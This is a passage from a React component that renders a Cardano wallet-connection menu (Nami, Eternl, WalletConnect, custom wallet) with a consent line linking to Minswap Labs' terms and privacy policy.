                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("Nami")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831806/v5xt2tc2lipxzhgsay3u.svg"
                          className="size-8 shrink-0"
                          alt="nami"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            Nami
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Mobile support
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("Eternl")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831836/zlxswqaargsgb5wtm3vb.svg"
                          className="size-8 shrink-0"
                          alt="eternl"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            Eternl
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Mobile support
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                      //   onClick={() => handleWalletSelection("WalletConnect")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831870/gwe5i02najzyogs8jqcj.svg"
                          className="size-8 shrink-0"
                          alt="walletconnect"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            WalletConnect
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Not Available
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("Custom")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831902/ofozmzoru4hd8fembeie.svg"
                          className="size-8 shrink-0"
                          alt="custom"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            Add Custom Wallet
                          </h1>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>

                      <div className="p-3">
                        <button className="flex select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors border outline-none cursor-pointer bg-[#1f2025] border-transparent text-itr-tentSec-df hover:bg-sf-pri-hv hover:border-transparent hover:text-itr-tentSec-df active:bg-sf-pri-pressed active:border-transparent active:text-textSecondary disabled:bg-sf-pri-dis disabled:border-transparent disabled:text-itr-tentSec-dis text-textSecondary text-sm px-5 py-2 rounded-full">
                          <span>More wallets...</span>
                        </button>
                      </div>
                    </div>
                  </div>

                  <div className="mt-6 lg:mt-[60px]">
                    <div className="p-2 text-xs text-textPrimary">
                      By connecting a wallet, you agree to Minswap Labs'{" "}
                      <Link
                        className="text-[#919bd1] font-semibold"
                        href="https://minswap.org/terms-of-service/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        Terms of Service
                      </Link>{" "}
                      and consent to its{" "}
                      <Link
                        className="text-[#919bd1] font-semibold"
                        href="https://minswap.org/cookie-policy/"
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        Privacy Policy
                      </Link>
                      .
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ConnectWallet;
